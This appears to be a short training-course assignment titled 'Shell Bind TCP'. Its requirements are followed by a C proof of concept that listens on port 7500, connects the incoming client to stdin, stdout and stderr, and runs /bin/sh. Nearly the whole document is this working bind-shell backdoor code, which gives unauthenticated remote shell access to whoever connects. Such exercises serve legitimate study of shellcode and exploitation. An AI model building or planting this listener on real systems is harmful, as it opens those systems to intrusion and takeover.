Assignment #1: Shell Bind TCP
=============================

Instructions:
-------------
* Bind to a port
* Exec /bin/sh on incoming connection
* Port number should be easily configurable

PoC:
----

```
int main(void){
	int fd, newfd;
	struct sockaddr_in server_addr;
	char *argv[] = { "/bin/sh", NULL };

	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(7500);
	server_addr.sin_addr.s_addr = htonl(INADDR_ANY);

	fd = socket(AF_INET, SOCK_STREAM, 0);

	bind(fd, (struct sockaddr *) &server_addr, 16);

	listen(fd, 1);

	newfd = accept(fd, NULL, NULL);

	//dup2 (0,1,2) (client will be connected to stdin, stdout and stderr)
	dup2(newfd, 0);
	dup2(newfd, 1);
	dup2(newfd, 2);

	execve(argv[0], &argv[0], NULL);

	return 0;
}
```
